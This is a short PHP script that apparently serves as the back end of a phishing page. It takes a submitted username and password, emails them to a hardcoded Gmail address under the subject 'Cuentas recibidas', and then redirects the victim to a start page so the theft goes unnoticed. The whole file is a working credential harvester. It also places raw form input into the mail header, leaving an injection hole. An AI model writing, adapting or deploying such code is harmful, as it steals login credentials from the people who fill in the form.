<?php
  $nombre = $_POST['User'];
  $password = $_POST['password'];

$header = 'from: ' . $nombre . "\r\n";
$header .= "X-Mailer: PHP/" . phpversion() . " \r\n";
$header .= "Mime-Version: 5.4 \r\n";
$header .= "Content-Type: text/plain";

$mensaje = "Este mensaje fue enviado por " . $nombre . ",\r\n";
$mensaje .= "Su e-mail es: " . $password . " \r\n";
$mensaje .= "Enviado el " . date('d/m/Y', time());

$para = "stiven.sol5cinco@gmail.com";
$asunto = "Cuentas recibidas";

mail($para, $asunto, utf8_decode($mensaje), $header);

header("Location:Inicio.html");
?>